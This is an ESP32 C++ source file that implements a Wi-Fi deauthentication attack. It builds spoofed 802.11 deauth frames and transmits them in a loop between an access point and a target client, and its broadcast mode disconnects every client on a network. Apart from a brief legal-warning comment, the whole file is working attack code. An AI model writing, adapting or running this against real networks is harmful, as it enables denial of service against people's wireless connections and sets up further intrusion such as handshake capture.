// WARNING: Sending deauthentication frames to networks you do not own or have
// explicit written authorization to test is illegal in most jurisdictions.
// This code is for authorized penetration testing and security research ONLY.

#include "wifi_tools.h"
#include <esp_wifi.h>

// 802.11 deauth frame skeleton
static const uint8_t DEAUTH_TEMPLATE[] = {
    0xC0, 0x00,             // Frame Control: deauth (type=0, subtype=12)
    0x3A, 0x01,             // Duration
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // Destination (broadcast placeholder)
    0x00,0x00,0x00,0x00,0x00,0x00, // Source (BSSID placeholder)
    0x00,0x00,0x00,0x00,0x00,0x00, // BSSID placeholder
    0x00, 0x00,             // Sequence control
    0x07, 0x00              // Reason: Class 3 frame received from non-associated STA
};

static uint8_t _frame[sizeof(DEAUTH_TEMPLATE)];

void WifiDeauth::setChannel(uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void WifiDeauth::sendDeauth(const uint8_t bssid[6], const uint8_t target[6],
                            uint8_t channel, int count) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    setChannel(channel);

    memcpy(_frame, DEAUTH_TEMPLATE, sizeof(DEAUTH_TEMPLATE));

    // Destination = target client
    memcpy(_frame + 4, target, 6);
    // Source = BSSID
    memcpy(_frame + 10, bssid, 6);
    // BSSID
    memcpy(_frame + 16, bssid, 6);

    Serial.printf("[Deauth] Sending %d frames -> %02X:%02X:%02X:%02X:%02X:%02X\n",
                  count * 2,
                  target[0],target[1],target[2],target[3],target[4],target[5]);

    for (int i = 0; i < count; i++) {
        // Direction: AP -> client
        _frame[1] = 0x00;
        esp_wifi_80211_tx(WIFI_IF_STA, _frame, sizeof(_frame), false);
        delayMicroseconds(200);

        // Direction: client -> AP (spoofed)
        memcpy(_frame + 4,  bssid,  6);
        memcpy(_frame + 10, target, 6);
        memcpy(_frame + 16, bssid,  6);
        esp_wifi_80211_tx(WIFI_IF_STA, _frame, sizeof(_frame), false);
        delayMicroseconds(200);

        // Restore original direction
        memcpy(_frame + 4,  target, 6);
        memcpy(_frame + 10, bssid,  6);
        memcpy(_frame + 16, bssid,  6);
    }
    esp_wifi_set_promiscuous(false);
}

void WifiDeauth::broadcastDeauth(const uint8_t bssid[6], uint8_t channel, int count) {
    static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    sendDeauth(bssid, BROADCAST, channel, count);
}
